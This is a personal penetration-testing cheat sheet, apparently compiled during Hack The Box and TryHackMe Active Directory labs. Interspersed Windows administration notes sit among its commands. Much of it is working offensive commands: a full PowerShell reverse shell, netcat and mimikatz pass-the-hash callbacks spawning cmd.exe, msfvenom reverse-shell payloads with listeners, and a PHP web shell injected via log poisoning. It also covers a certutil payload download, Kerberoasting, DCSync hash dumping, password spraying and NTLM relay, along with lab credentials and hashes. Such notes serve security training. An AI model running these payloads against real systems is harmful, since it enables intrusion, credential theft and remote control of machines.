# TOC
- [setup](#setup)
- [RDP](#rdp)
- [AD](#ad)
- [xfreerdp](#xfreerdp)
- [remmina](#remmina)

---

# Tools
https://github.com/GhostPack/Seatbelt  
https://github.com/funoverip/mcafee-sitelist-pwd-decryption  
https://github.com/wavestone-cdt/powerpxe/blob/master/PowerPXE.ps1  
https://github.com/wavestone-cdt/powerpxe/tree/master
https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/
https://github.com/cube0x0/CVE-2021-1675/tree/main
https://pypi.org/project/requests-ntlm/

# setup
- impacket
```
$ pa3
$ pip install impacket
# test
$ secretsdump.py -h
$ which secretsdump.py
```
- python
```zsh
$ pip install requests-ntlm
```

- slapd(OpenLDAP)
```zsh
$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

- remmina
https://remmina.org/how-to-install-remmina/
```zsh
$ sudo apt install remmina remmina-plugin-rdp remmina-plugin-secret
```

# xfreerdp
```
$ xfreerdp /v:XXX.XXX.XXX.XXX /u:TestUser /p:TestPassword /dynamic-resolution +clipboard
```
`/dynamic-resolution` option may not work well.

# Remmina
```zsh
$ remmina -c rdp://TestUser@XXX.XXX.XXX.XXX
```

# ssh
```zsh
$ ssh HOGE.com\\TestUser@TestHost.HOGE.com
$ ssh TestUser@XXX.XXX.XXX.XXX -R 8888:TestHost.HOGE.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
```

# socat
```zsh
$ socat TCP4-LISTEN:13514,fork TCP4:TestTargetHost.HOGE.com:3389
```

# TFTP
```zsh
$ tftp -i XXX.XXX.XXX.XXX GET "\Tmp\x64{8A98E259-D569-5C1B-A098-986F5B5736FF}.bcd" conf.bcd
$ tftp -i XXX.XXX.XXX.XXX GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

# scp
```zsh
$ scp TestUser@HOGE.com:C:/Users/TestUser/Documents/20240518062907_BloodHound.zip .
```

# nmap
```zsh
$ sudo nmap XXX.XXX.XXX.XXX -p49555 -sV
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p-
$ sudo nmap XXX.XXX.XXX.XXX -A -sV -sC -p8080
$ sudo nmap -A -p- 172.16.5.5
$ sudo nmap -sV -p- 172.16.5.130
$ sudo nmap -sV -p- 172.16.5.225
```

# fping
```zsh
$ fping -asgq 172.16.5.0/23
```

# Responder
```zsh
$ sudo responder -I ens224 
```

# ffuf
```zsh
$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
```

# nc
```zsh
$ sudo nc -lvnp LPORT
```

# Windows Built-In
```powershell
# one line
PS> powershell -nop -c "powershell command; powershell command...;"
PS> powershell -command "Start-Process -Verb runas cmd"
# Reverse Shell
PS> $client = New-Object System.Net.Sockets.TCPClient('XXX.XXX.XXX.XXX',RPORT);
PS> $stream = $client.GetStream()
PS> [byte[]]$bytes = 0..65535|%{0}
PS> while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.PS> ASCIIEncoding).GetString($bytes,0, $i)
PS> $sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' +  (pwd).Path + '> '
PS> $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
PS> $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
# Reverse Shell - One Line
PS> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5,888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# Memo
PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs; exit }
```
## runas
```powershell
PS> runas /netonly /user:HOGE.com\TestUser cmd.exe
PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX.XXX.XXX 4443"
```
## Import-Module ActiveDirectory
```powershell
PS> Import-Module ActiveDirectory; $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force; Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
```
## sc.exe
```zsh
$ sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
```

# Metasploit
```zsh
$ msfvenom -l payloads
$ msfvenom -p java/jsp_shell_reverse_tcp --list-options
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > shell.war
> set TARGETURI /manager/html
> set HttpPassword Tomcatadm
> set HttpUsername tomcat
> set LHOST 172.16.1.5
> set RHOSTS 172.16.1.11
> set RPORT 8080
# Download Module Manually
## search 50064.rb
## https://www.exploit-db.com/exploits/50064
$ cp ~/Downloads/50064.rb /usr/share/metasploit-framework/modules/my/50064.rb
$ msfconsole -m /usr/share/metasploit-framework/modules/
manual payload download
/usr/share/metasploit-framework/modules/exploits
/usr/share/metasploit-framework/modules/auxiliary
I try. only above folder can be impacted to search and use command
msf6 > reload_all
#
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.65.31 LPORT=4444 -o myservice.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.31 LPORT=4445 -f msi > myinstaller.msi

msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST 10.50.65.31; set LPORT 4445;exploit"
#
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.31.110 LPORT=443 -f psh -o shell.ps1
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.31.110; set LPORT 443; exploit"
#
download C:\\Users\\t1_trevor.jones\\Documents\\PasswordDatabase.kdbx /root
```

# Memo
```zsh
$ http://XXX.XXX.XXX.XXX:RPORT/index.php?page=php://filter/read=convert.base64-encode/resource=index
$ echo "~~~" | base64 -d | grep ".php"
# access to : hoge/index.php"
$ ffuf -w -u http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=FUZZ
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
$ curl -s "http://XXX.XXX.XXX.XXX:RPORT/index.php" -A '<?php system($_GET["cmd"]); ?>'
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log&cmd=id
# access to : http://XXX.XXX.XXX.XXX:RPORT/hoge/index.php?log=../../../../../../var/log/nginx/access.log
# php file
## <?php system($_GET["cmd"]); ?>
# User-Agent: <?php system($_GET['cmd']); ?>
$ curl -X POST 'http://XXX.XXX.XXX.XXX:8080/webshell/api' --data "action=exec&cmd=id" 
```



Windows Version
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber

tree c:\
tree c:\ /f | more
tree c:\ /f | Select-String "flag" -context 20, 10

File System
NTFS
icacls
icacls c:\windows
icacls c:\users


Get-Service | ? {$_.Status -eq "Running"} | select -First 2 | fl

Get-Service | ? {$_.Name -like "*pdate*"} | select -First 2 | fl

Get-Service | ? {$_.Status -eq "Running"} | echo | sls "update"

Get-Service | ? {$_.DisplayName -like "*Update*"} | select -First 4 | fl

Get-Service -Name FoxitReaderUpdateService | fl

$service = Get-Service -Name FoxitReaderUpdateService | Write-Output "Executable Path : $($service.PathName)"
... no display

https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4
PowerShell 6.0 以降では、ServiceController オブジェクトに UserName、Description、DelayedAutoStart、BinaryPathName、StartupType の各プロパティが追加されています。

$PSVersionTable.PSVersion

xxxx : get-alias | sls "*ipconfig*"
Get-Alias | select -First 2
Get-Alias | Where-Object { $_.Name -like '*ipconfig*' }

Get-ExecutionPolicy -List

- WMI
wmic os list brief

whoami /user

Get-WmiObject Win32_Account | Select-Object SID, Name

tree c:\ /f | Select-String "Company" -context 20, 10

Get-WmiObject Win32_Share | Select-Object Name, Path
Get-SmbShare | Select-Object Name, Path


New-SmbShare -Path c:\ -Name "Company Data" -FullAccess 'Everyone'


New-Item -ItemType Directory -Path .\"Company Data"

icacls .\"Company Data"
New-SmbShare -Path .\ -Name "Company Data"

New-SmbShare -Path C:\Users\htb-student\"Company Data" -Name "Company Data" -FullAccess 'Everyone'

##
# Specify the path for the new shared folder
$sharedFolderPath = 'C:\Users\htb-student\Company Data'

# Specify the name for the new shared folder
$shareName = 'YourShareName'

# Create a new shared folder
New-SmbShare -Path $sharedFolderPath -Name $shareName -ReadAccess 'Everyone'

#####
# Specify the username and password for the new user
$username = 'Jim'
$password = ConvertTo-SecureString 'YourPassword' -AsPlainText -Force

# Create a new local user
New-LocalUser -Name $username -Password $password -FullName 'Jim' -Description 'Description of the new user' -AccountNeverExpires

##
# Specify the name of the security group
$groupName = 'HR'

# Create a new local security group
New-LocalGroup -Name $groupName -Description 'HR Department'

##
# Specify the username and group name
$username = 'Jim'; $groupName = 'HR'; Add-LocalGroupMember -Group $groupName -Member $username


##
# Specify the shared folder path and name
$sharedFolderPath = 'C:\Users\htb-student\Company Data'; $shareName = 'YourShareName'

# Specify the security group name
$securityGroupName = 'HR'

# Remove the default group from the share permissions
Remove-SmbShare -Name $shareName -Force

# Create a new shared folder with specific permissions
New-SmbShare -Path $sharedFolderPath -Name $shareName -ChangeAccess $securityGroupName -ReadAccess $securityGroupName

# Add the security group to the existing shared folder
Add-SmbShareAccess -Name $shareName -AccountName $securityGroupName -AccessRight Change

I apologize for the confusion. The Add-SmbShareAccess cmdlet is available on Windows Server editions and not on regular Windows client editions. If you are using a Windows client version, you can use the net share and icacls commands to achieve the same result. 

net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"

# Disable inheritance before setting specific NTFS permissions
icacls $sharedFolderPath /inheritance:r

# Set NTFS permissions using icacls
icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"


## next
# Specify the path to the HR subfolder
# Specify the security group name
# Remove the default group from NTFS permissions
# Disable inheritance before setting specific NTFS permissions
# Set NTFS permissions using icacls
$subFolderPath = 'C:\Users\htb-student\Company Data\HR'; $securityGroupName = 'HR'; icacls $subFolderPath /remove "Users"; icacls $subFolderPath /inheritance:r; icacls $subFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"

##
# List SIDs for local users
Get-WmiObject Win32_UserAccount | Select-Object Name, SID

# List SIDs for local groups
Get-WmiObject Win32_Group | Select-Object Name, SID


Get-Service

Get-Service | ? {$_.DisplayName -like "*Update*"} 



# URL
https://zsh-prompt-generator.site/
https://bash-prompt-generator.org/

- shell
https://explainshell.com/

- Windows Server Core
https://learn.microsoft.com/ja-jp/windows-server/administration/server-core/what-is-server-core

- Get-Service
https://learn.microsoft.com/ja-jp/powershell/module/microsoft.powershell.management/get-service?view=powershell-7.4

- vnstat command
https://humdi.net/vnstat/

- EyeWitness
EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.
https://github.com/RedSiege/EyeWitness
https://www.christophertruncer.com/eyewitness-2-0-release-and-user-guide/

- DREAD_(risk_assessment_model)
https://en.wikipedia.org/wiki/DREAD_(risk_assessment_model)

- Nessus Attack Scripting Language
https://en.wikipedia.org/wiki/Nessus_Attack_Scripting_Language

- Filesystem Hierarchy Standard (FHS)
https://www.pathname.com/fhs/


# file index number  - inode
```
htb-student@nixfund:/etc$ stat sudoers
  File: sudoers
  Size: 755             Blocks: 8          IO Block: 4096   regular file
Device: 801h/2049d      Inode: 147627      Links: 1
Access: (0440/-r--r-----)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2024-01-01 08:21:19.971766710 +0000
Modify: 2018-01-18 00:08:16.000000000 +0000
Change: 2021-08-03 12:08:36.494845988 +0000
 Birth: -
htb-student@nixfund:/etc$ ls -i sudoers
147627 sudoers
htb-student@nixfund:/etc$
```

# find
```zsh
$ find / -name *.log 2>/dev/null | wc -l
$ find / -name "*.bak" 2>/dev/null
$ find / -name *.conf* -type f -size +25k -size -28k -newermt 2020-03-03 2>/dev/null
```

# apt, dpkg
```zsh
$ apt list --installed | wc -l
$ dpkg -l
$ dpkg -l | grep ^ii | wc -l
```

```zsh
$ cat /etc/passwd | grep -v "false\|nologin" | cut -d":" -f1
```

# column command
column command might be useful for a dman diplay of volatility 3
```zsh
$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t

root         x  0     0      root               /root        /bin/bash
sync         x  4     65534  sync               /bin         /bin/sync
mrb3n        x  1000  1000   mrb3n              /home/mrb3n  /bin/bash
```

# netstat and ss
```
$ netstat -tuln
$ ss -tuln
$ ss -tuln4 | grep LISTEN | grep -v 127.0.0.1 | wc -l

-t: Show TCP connections.
-u: Show UDP connections.
-l: Show only listening sockets.
-n: Show numerical addresses instead of resolving hostnames.
-4: IPv4
```

```
$ systemctl list-units --type=service
```

What is the type of the service of the "syslog.service"?
As for the type of service, systemd categorizes services into different types, such as "simple," "forking," "oneshot," "dbus," etc. The type of the "syslog.service" would depend on how the syslog daemon is managed by systemd.

systemctl show -p Type syslog.service

# Hashcat
```zsh
$ echo "backupagent::INLANEFREIGHT:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
$ hashcat -m 5600 ./backupagent_hash /usr/share/wordlists/rockyou.txt
$ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
```

## Enumerating Users with Kerbrute
### Kerbrute User Enumeration
$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt

$ kerbrute userenum -d hogehoge.local --dc XXX.XXX.XXX.XXX /opt/jsmith.txt > result.txt


$ cat result.txt | awk -F " " '{printf("%s\n", $7)}' | grep @ | sed 's/@inlanefreight\.local//' > valid_users.txt



# Internal Password Spraying - from Windows
PS > Import-Module .\DomainPasswordSpray.ps1
PS > Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue

# rpcclient
# https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb/rpcclient-enumeration
# https://cheatsheet.haax.fr/network/services-enumeration/135_rpc/
```zsh
$ rpcclient -U "" -N 172.16.5.5 -c "queryuser 1170"
$ rpcclient -U "" -N 172.16.5.5 -c "enumdomgroups" > a.txt
$ grep Intern a.txt
group:[Interns] rid:[0xff0]
$ echo $((16#ff0))
4080
$ rpcclient -U "" -N XXX.XXX.XXX.XXX
> querydominfo
> getdompwinfo
```


## BloodHound  
```powershell
PS> .\SharpHound.exe -c All --zipfilename hoge
PS> BloodHound.exe
# On GUI
## Upload Data ... zip file
## Check ... Analysis Tab
```

## PowerView  
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

## Snaffer  
https://github.com/SnaffCon/Snaffler  
```powershell
PS> Snaffler.exe -s -d hoge.local -o snaffler.log -v data
```
## Dsquery  
https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)  
```powershell
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"
PS> dsquery * -filter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr description
PS> dsquery * domainroot -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr description
```

# keberoasting
user: user1
password: password1
```zsh
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/user1
[ENTER PASSWORD] password1
``````
```zsh
# test
$ sudo crackmapexec smb 172.16.5.5 -u SAPService_tgs -p !SapperFi2
-bash: !SapperFi2: event not found
$
$ set +H
$ sudo crackmapexec smb 172.16.5.5 -u SAPService -p !SapperFi2 --groups
```

python3 windapsearch.py --dc-ip 172.16.5.5 -u SAPService@inlanefreight.local -p !SapperFi2 -PU


net user %username%

psexec.py inlanefreight.local/SAPService:'!SapperFi2'@172.16.5.5

smbclient -U SAPService -N 172.16.5.5

# smbmap
```zsh
$ smbmap -u hoge_user -p hoge_password -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
```

sudo bloodhound-python -u 'SAPService' -p 'SapperFi2' -ns 172.16.5.5 -d inlanefreight.local -c all

# setspn
```powershell
PS> setspn.exe -Q */*
PS> setspn.exe -Q vmware/inlanefreight.local
```

## targeting single user
```powershell
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local:1433"
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "vmware/inlanefreight.local"
```

# mimikatz
```
PS> mimikatz.exe
mimikatz # privilege::debug
mimikatz# base64 /out:true
mimikatz# kerberos::list /export
mimikatz# kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
mimikatz# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.31 5556"
```

```zsh
$ echo "dsaffadsfdsafsf==" | tr -d \\n < result.txt
$ cat result.txt | base64 -d > sqldev.kirbi
$ pa2
$ python ./kirbi2john.py sqldev.kirbi
$ cat crack_file
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
$ cat sqldev_tgs_hashcat
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

```ps
PS> Find-InterestingDomainAcl
PS> Import-Module .\PowerView.ps1
# user : forend
PS> $sid = Convert-NameToSid forend
PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
PS> Get-DomainGroup -Identity "Dagmar Payne" | select memberof
PS> $itgroupsid = Convert-NameToSid "Information Technology"
PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose

Get-DomainObjectACL | ? {$_.SecurityIdentifier -eq $sid} -Verbose

Allow-All

```

# DCSync
```ps
# user: hoge
PS> Get-DomainUser -Identity hoge | select samaccountname,objectsid,memberof,useraccountcontrol |fl
# get sid
PS> sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
```zsh
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
$ ls inlanefreight_hashes*
```
```ps
PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
PS> Import-Module .\PowerView.ps1
PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol


powershell
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc



certutil.exe -urlcache -split -f http://10.50.31.110:443/shell.ps1

SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.200.83.201"
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.83.201 -debug


$ Set-ADAccountPassword -Identity "t2_june.russell" -Reset -NewPassword $Password
$ $username = 't1_corine.waters'; $password = 'Korine.1994'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = $ New-Object System.Management.Automation.PSCredential $username, $securePassword; $Opt = New-CimSessionOption -Protocol DCOM; $Session =  New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
$ Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Select-String sid
$ $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
$ Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com


# SharpHound
SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
